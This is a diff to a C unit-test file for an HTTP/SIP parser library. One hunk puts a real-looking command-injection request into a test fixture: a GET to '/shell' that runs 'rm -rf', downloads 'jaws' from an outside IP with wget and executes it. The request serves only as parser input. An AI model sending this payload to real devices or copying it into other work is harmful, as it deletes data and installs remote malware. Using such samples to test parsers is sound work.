@@ -30,7 +30,7 @@ static void http_request_test(void)
 
 static void http_request_test2(void)
 {
-	static const char* s = "GET /xxx?cdxx+/tmp;rmxxx+-xxxrf+*;xxx+ 0.0.0.0/jawsxx;xxx+/tmp/jawsxx HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q\r\n";
+	static const char* s = "GET /shell?cd+/tmp;rm+-rf+*;wget+ 65.21.184.203/jaws;sh+/tmp/jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q\r\n";
 
 	size_t n;
 	int major, minor;
@@ -41,7 +41,7 @@ static void http_request_test2(void)
 	parser = http_parser_create(HTTP_PARSER_REQUEST, NULL, NULL);
 	assert(1 /*INPUT_HEADER*/ == http_parser_input(parser, s, &n));
 	assert(0 == http_get_version(parser, protocol, &major, &minor) && 1 == major && 1 == minor && 0 == strcmp("HTTP", protocol));
-	assert(0 == strcmp(http_get_request_uri(parser), "/xxx?xxx+/tmp;xxx+-xxx+*;xxx+ 0.0.0.0/jaws;xxx+/tmp/jaws"));
+	assert(0 == strcmp(http_get_request_uri(parser), "/shell?cd+/tmp;rm+-rf+*;wget+ 65.21.184.203/jaws;sh+/tmp/jaws"));
 	assert(0 == strcmp(http_get_request_method(parser), "GET"));
 	assert(0 == strcmp(http_get_header_by_name(parser, "Host"), "127.0.0.1:80"));
 	assert(0 == strcmp(http_get_header_by_name(parser, "User-Agent"), "Hello, world"));
@@ -226,7 +226,7 @@ static void sip_request_test2(void)
 	assert(0 == strcmp(http_get_header_by_name(parser, "CSeq"), "314159 INVITE"));
 	assert(0 == strcmp(http_get_header_by_name(parser, "Contact"), "<sip:alice@pc33.atlanta.com>"));
 	assert(0 == strcmp(http_get_content_type(parser), "application/sdp"));
-	assert(24 == http_get_content_length(parser));
+	assert(-1 == http_get_content_length(parser));
 	http_parser_destroy(parser);
 }
 
